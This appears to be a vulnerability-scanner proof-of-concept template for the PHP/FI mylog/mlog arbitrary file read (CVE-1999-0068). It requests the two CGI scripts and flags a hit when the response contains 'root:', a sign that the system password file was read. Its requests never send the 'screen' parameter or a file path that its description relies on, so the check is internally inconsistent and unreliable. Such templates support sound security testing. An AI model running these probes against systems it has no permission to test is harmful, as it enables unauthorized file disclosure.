[info]
author = "ave"
description = "检测 PHP/FI 1.0 至 2.0 b10 版本中 mylog.html/mlog.html 示例脚本的任意文件读取漏洞。screen 参数直接传入 PHP include 语句且未做路径过滤，攻击者可指定任意系统文件路径实现文件读取。"
id = "POC-AVE-1999-0169"
name = "PHP/FI mylog/mlog CGI Arbitrary File Read PoC"
severity = "high"
tags = ["ave-1999-0169"]
vuln_id = [
    "CVE-1999-0068",
    "AVE-1999-0169",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/mlog.html"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/mylog.html"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
